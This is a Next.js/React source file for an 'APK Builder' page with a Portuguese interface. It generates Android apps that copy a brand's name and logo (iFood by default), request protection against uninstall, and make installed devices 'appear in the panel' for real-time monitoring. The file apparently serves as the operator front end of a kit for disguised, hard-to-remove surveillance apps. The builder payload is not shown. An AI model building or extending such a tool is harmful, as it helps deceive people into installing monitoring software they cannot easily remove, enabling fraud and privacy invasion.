'use client';

import { useState } from 'react';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Card } from '@/components/ui/card';
import { AlertCircle, CheckCircle2, Download } from 'lucide-react';

export default function APKBuilderPage() {
  const [config, setConfig] = useState({
    appName: 'iFood',
    appUrl: 'https://www.ifood.com.br/',
    logoUrl: 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT5m8BQnb3hqlmxu_ejrE3y3PGUlgCVyE7Og&s',
  });

  const [isBuilding, setIsBuilding] = useState(false);
  const [buildProgress, setBuildProgress] = useState(0);
  const [error, setError] = useState('');
  const [success, setSuccess] = useState(false);
  const [downloadUrl, setDownloadUrl] = useState('');
  const [downloadFilename, setDownloadFilename] = useState('');

  const handleBuildAPK = async () => {
    setError('');
    setSuccess(false);
    setDownloadUrl('');
    setIsBuilding(true);
    setBuildProgress(0);

    try {
      // Show progress
      let interval: NodeJS.Timeout | null = null;
      interval = setInterval(() => {
        setBuildProgress((prev) => Math.min(prev + Math.random() * 30, 90));
      }, 500);

      // Call tRPC endpoint using trpc client
      const response = await fetch('/api/trpc/apk.build', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          json: {
            companyName: config.appName,
            companyUrl: config.appUrl,
            logoUrl: config.logoUrl || undefined,
            protectFromUninstall: true,
          },
        }),
      });

      if (interval) clearInterval(interval);

      // Check if response is ok
      if (!response.ok) {
        const errorText = await response.text();
        throw new Error(`HTTP ${response.status}: ${errorText}`);
      }

      const result = await response.json();
      console.log('APK Build Response:', result);

      setBuildProgress(100);

      // Extract data from response - handle multiple formats
      let data = null;
      
      if (Array.isArray(result)) {
        // Batch format
        data = result[0]?.result?.data;
      } else if (result?.result?.data) {
        // Normal tRPC format
        data = result.result.data;
      } else if (result?.success) {
        // Direct response
        data = result;
      }

      console.log('Extracted data:', data);

      // Check if build was successful
      if (data?.success && data?.downloadUrl) {
        const filename = data.filename || data.downloadUrl.split('/').pop() || 'app.apk';
        setDownloadUrl(data.downloadUrl);
        setDownloadFilename(filename);
        setSuccess(true);
      } else {
        throw new Error(data?.error || data?.message || 'Erro ao gerar APK');
      }
    } catch (err) {
      console.error('Build error:', err);
      setError(err instanceof Error ? err.message : 'Erro ao gerar APK');
    } finally {
      setIsBuilding(false);
    }
  };

  const handleDownload = () => {
    if (downloadUrl) {
      const link = document.createElement('a');
      link.href = downloadUrl;
      link.download = downloadFilename;
      document.body.appendChild(link);
      link.click();
      document.body.removeChild(link);
    }
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-900 via-blue-900 to-slate-900 p-4 md:p-8">
      <div className="max-w-6xl mx-auto">
        {/* Header */}
        <div className="mb-8">
          <h1 className="text-4xl font-bold text-cyan-300 flex items-center gap-3 mb-2">
            🔨 APK Builder
          </h1>
          <p className="text-slate-300">Gere um APK customizado que abre qualquer URL. Seus clientes instalam e aparecem no painel.</p>
        </div>

        {/* Main Grid */}
        <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
          {/* Left Column - Configuration */}
          <div className="lg:col-span-1 space-y-4">
            <div className="bg-slate-800/50 border border-slate-700 rounded-lg p-4 space-y-4">
              <h2 className="text-xl font-bold text-cyan-300 mb-4 flex items-center gap-2">
                📋 Configuração
              </h2>

              <div className="space-y-4">
                {/* App Name */}
                <div>
                  <label className="block text-sm font-medium text-slate-300 mb-2">
                    Nome do App *
                  </label>
                  <Input
                    value={config.appName}
                    onChange={(e) => setConfig({ ...config, appName: e.target.value })}
                    placeholder="Ex: iFood"
                    className="bg-slate-700 border-slate-600 text-white placeholder-slate-500"
                  />
                  <p className="text-xs text-slate-400 mt-1">Aparecerá no ícone do app</p>
                </div>

                {/* App URL */}
                <div>
                  <label className="block text-sm font-medium text-slate-300 mb-2">
                    URL do App *
                  </label>
                  <Input
                    value={config.appUrl}
                    onChange={(e) => setConfig({ ...config, appUrl: e.target.value })}
                    placeholder="https://www.ifood.com.br/"
                    className="bg-slate-700 border-slate-600 text-white placeholder-slate-500"
                  />
                  <p className="text-xs text-slate-400 mt-1">O APK abrirá esta URL</p>
                </div>

                {/* Logo URL */}
                <div>
                  <label className="block text-sm font-medium text-slate-300 mb-2">
                    Logo do App (URL)
                  </label>
                  <Input
                    value={config.logoUrl}
                    onChange={(e) => setConfig({ ...config, logoUrl: e.target.value })}
                    placeholder="https://example.com/logo.png"
                    className="bg-slate-700 border-slate-600 text-white placeholder-slate-500"
                  />
                  <p className="text-xs text-slate-400 mt-1">Opcional - Logo no ícone</p>
                </div>
              </div>
            </div>

            {/* Error/Success Messages */}
            {error && (
              <div className="bg-red-900/30 border border-red-600 rounded-lg p-4 flex gap-3">
                <AlertCircle className="text-red-400 flex-shrink-0" size={20} />
                <p className="text-red-300 text-sm">{error}</p>
              </div>
            )}

            {success && (
              <div className="bg-green-900/30 border border-green-600 rounded-lg p-4 flex gap-3">
                <CheckCircle2 className="text-green-400 flex-shrink-0" size={20} />
                <p className="text-green-300 text-sm">APK gerado com sucesso!</p>
              </div>
            )}

            {/* Build Button */}
            <Button
              onClick={handleBuildAPK}
              disabled={isBuilding || !config.appName || !config.appUrl}
              className="w-full bg-cyan-500 hover:bg-cyan-600 text-white font-bold py-3 text-lg"
            >
              {isBuilding ? `Gerando... ${Math.round(buildProgress)}%` : '⬇️ Gerar APK'}
            </Button>

            {/* Download Button */}
            {success && downloadUrl && (
              <Button
                onClick={handleDownload}
                className="w-full bg-green-600 hover:bg-green-700 text-white font-bold py-3 text-lg flex items-center justify-center gap-2"
              >
                <Download size={20} />
                Baixar APK
              </Button>
            )}
          </div>

          {/* Middle Column - Phone Preview */}
          <div className="lg:col-span-1">
            <h2 className="text-xl font-bold text-cyan-300 mb-4 flex items-center gap-2">
              📱 Prévia do Celular
            </h2>

            {/* Phone Frame */}
            <div className="bg-gradient-to-b from-slate-900 to-slate-800 rounded-3xl border-8 border-slate-700 p-3 shadow-2xl mx-auto max-w-sm">
              {/* Phone Screen */}
              <div className="bg-black rounded-2xl overflow-hidden aspect-[9/16] flex flex-col">
                {/* Status Bar */}
                <div className="bg-black text-white text-xs px-4 py-2 flex justify-between items-center">
                  <span>9:41</span>
                  <span>📶 📡 🔋</span>
                </div>

                {/* App Content */}
                <div className="flex-1 bg-slate-50 flex flex-col items-center justify-center p-4 gap-4">
                  {/* App Icon */}
                  <div className="w-20 h-20 rounded-2xl bg-gradient-to-br from-cyan-400 to-blue-600 flex items-center justify-center shadow-lg overflow-hidden">
                    {config.logoUrl ? (
                      <img
                        src={config.logoUrl}
                        alt="Logo"
                        className="w-full h-full object-cover"
                        onError={(e) => {
                          (e.target as HTMLImageElement).style.display = 'none';
                        }}
                      />
                    ) : (
                      <span className="text-3xl">📱</span>
                    )}
                  </div>

                  {/* App Name */}
                  <h3 className="text-slate-900 font-bold text-lg text-center">{config.appName}</h3>

                  {/* Info Text */}
                  <div className="mt-4 text-center text-slate-600 text-xs">
                    <p>Toque para abrir</p>
                  </div>
                </div>
              </div>
            </div>
          </div>

          {/* Right Column - Info */}
          <div className="lg:col-span-1 space-y-4">
            <Card className="bg-slate-800/50 border-slate-700 p-4">
              <h3 className="text-cyan-300 font-bold mb-3 flex items-center gap-2">
                💡 Como funciona:
              </h3>
              <ul className="text-slate-300 text-sm space-y-2">
                <li className="flex gap-2">
                  <span>✓</span>
                  <span>APK abre uma URL em WebView</span>
                </li>
                <li className="flex gap-2">
                  <span>✓</span>
                  <span>Cliente instala normalmente</span>
                </li>
                <li className="flex gap-2">
                  <span>✓</span>
                  <span>Dispositivo aparece no painel</span>
                </li>
                <li className="flex gap-2">
                  <span>✓</span>
                  <span>Você monitora em tempo real</span>
                </li>
              </ul>
            </Card>

            <Card className="bg-slate-800/50 border-slate-700 p-4">
              <h3 className="text-cyan-300 font-bold mb-3 flex items-center gap-2">
                📥 Download Info
              </h3>
              <p className="text-slate-300 text-sm">
                {success && downloadUrl
                  ? `APK gerado! Clique em "Baixar APK" para fazer download do arquivo ${downloadFilename}`
                  : 'Gere um APK para ver o arquivo aqui'}
              </p>
            </Card>
          </div>
        </div>
      </div>
    </div>
  );
}
